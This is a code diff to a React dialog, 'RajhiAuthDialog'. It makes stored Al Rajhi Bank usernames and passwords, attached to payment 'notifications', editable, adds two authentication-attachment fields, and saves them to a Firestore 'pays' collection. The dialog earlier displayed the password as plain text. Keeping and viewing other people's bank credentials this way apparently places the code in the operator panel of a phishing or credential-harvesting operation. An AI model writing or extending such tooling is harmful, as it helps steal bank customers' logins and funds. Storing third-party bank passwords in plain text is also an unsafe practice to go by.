@@ -27,6 +27,49 @@ export function RajhiAuthDialog({
   onOpenChange,
   notification,
 }: RajhiAuthDialogProps) {
+  const [username, setUsername] = useState(
+    notification?.externalUsername || ""
+  );
+  const [password, setPassword] = useState(
+    notification?.externalPassword || ""
+  );
+  const [autnAttachment, setAutnAttachment] = useState(
+    notification?.autnAttachment || ""
+  );
+  const [requierdAttachment, setRequierdAttachment] = useState(
+    notification?.requierdAttachment || ""
+  );
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleSave = async () => {
+    if (!notification?.id) return;
+
+    setIsSubmitting(true);
+    try {
+      const docRef = doc(db, "pays", notification.id);
+      await updateDoc(docRef, {
+        externalUsername: username,
+        externalPassword: password,
+        autnAttachment: autnAttachment,
+        requierdAttachment: requierdAttachment,
+      });
+
+      toast.success("تم حفظ بيانات الراجحي بنجاح", {
+        position: "top-center",
+        duration: 3000,
+      });
+      onOpenChange(false);
+    } catch (error) {
+      console.error("Error updating Rajhi credentials:", error);
+      toast.error("حدث خطأ أثناء حفظ البيانات", {
+        position: "top-center",
+        duration: 3000,
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent
@@ -61,8 +104,8 @@ export function RajhiAuthDialog({
                 <User className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                 <Input
                   id="username"
-                  readOnly
-                  value={notification?.externalUsername}
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
                   className="pr-10"
                   dir="ltr"
                 />
@@ -77,18 +120,50 @@ export function RajhiAuthDialog({
                 <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                 <Input
                   id="password"
-                  type="text"
-                  readOnly
-                  value={notification?.externalPassword}
+                  type="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                   className="pr-10"
                   dir="ltr"
                 />
               </div>
             </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="autnAttachment" className="text-right">
+                مرفق التوثيق
+              </Label>
+              <Input
+                id="autnAttachment"
+                value={autnAttachment}
+                onChange={(e) => setAutnAttachment(e.target.value)}
+                dir="ltr"
+              />
+            </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="requierdAttachment" className="text-right">
+                المرفق المطلوب
+              </Label>
+              <Input
+                id="requierdAttachment"
+                value={requierdAttachment}
+                onChange={(e) => setRequierdAttachment(e.target.value)}
+                dir="ltr"
+              />
+            </div>
           </div>
         </div>
 
-        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t"></DialogFooter>
+        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
+          <Button
+            onClick={handleSave}
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
+          >
+            {isSubmitting ? "جاري الحفظ..." : "حفظ البيانات"}
+          </Button>
+        </DialogFooter>
       </DialogContent>
     </Dialog>
   );
